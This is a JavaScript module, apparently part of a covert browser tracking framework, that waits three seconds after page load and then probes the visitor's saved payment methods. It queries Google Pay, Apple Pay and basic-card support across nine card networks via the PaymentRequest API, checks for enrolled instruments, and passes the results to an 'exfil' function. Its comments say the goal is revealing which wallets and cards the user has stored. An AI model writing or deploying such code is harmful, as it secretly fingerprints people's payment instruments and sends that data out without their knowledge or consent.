/* m-cards.js — Payment methods enumeration (Google Pay/Apple Pay/basic-card) + saved instruments.
   canMakePayment() revela qué wallets/tarjetas tiene guardadas el usuario. */
(function(G){
if(!G)return; if(G._M&&G._M.cards)return; G._M=G._M||{}; G._M.cards=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var METHODS=['https://google.com/pay','https://apple.com/apple-pay','https://pci.tech.target.basic-card','basic-card'];
var NETWORKS=['visa','mastercard','amex','discover','jcb','diners','maestro','unionpay','mir'];
var pm=window.PaymentRequest;
if(!pm){exfil('cards',{available:false});return}
async function probe(){
var res={};
// enumerar wallets pagos
for(var i=0;i<METHODS.length;i++){
var m=METHODS[i];try{
var data=m==='basic-card'?{supportedNetworks:NETWORKS,supportedTypes:['credit','debit','credit']}:{};
var pr=new pm([{supportedMethods:m,data:data}],{total:{label:'T',amount:{currency:'USD',value:'0.01'}}});
res[m.split('//')[1]||m]=await pr.canMakePayment();
}catch(e){res[m]=false}}
// billing/shipping enumeration (si el user ya dio dirección a un checkout, PaymentRequest la reusa)
try{var pr2=new pm([{supportedMethods:'basic-card',data:{supportedNetworks:NETWORKS}}],{total:{label:'T',amount:{currency:'USD',value:'0.01'}}},{
requestBillingAddress:true,requestShipping:true,requestPayerName:true,requestPayerEmail:true,requestPayerPhone:true});
res.billingSupported=true;
var has=await pr2.hasEnrolledInstrument();res.hasInstrument=has;
}catch(e){res.billingErr=e.message}
exfil('cards-enum',res);
}
setTimeout(probe,3000);
}catch(e){hx('m-cards-err',{m:e.message})}
})(window.__GE__);
